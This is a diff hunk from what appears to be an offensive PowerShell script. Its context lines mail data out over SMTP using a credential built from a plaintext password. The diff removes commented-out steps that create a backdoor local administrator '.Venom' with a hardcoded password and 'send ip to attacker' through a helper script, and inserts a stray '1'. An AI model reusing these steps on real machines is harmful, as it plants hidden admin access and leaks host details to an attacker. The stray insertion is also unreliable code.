@@ -65,15 +65,7 @@ Send-MailMessage `
     -Port 587 `
     -UseSsl `
     -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))
-
-
-# create admin user
-#$NewLocalAdmin = ".Venom"
-#$Password = (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
-#Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
-
-# send ip to attacker
-#./smtp.ps1
+1
 
 #goto temp, make working dir
 mkdir $path
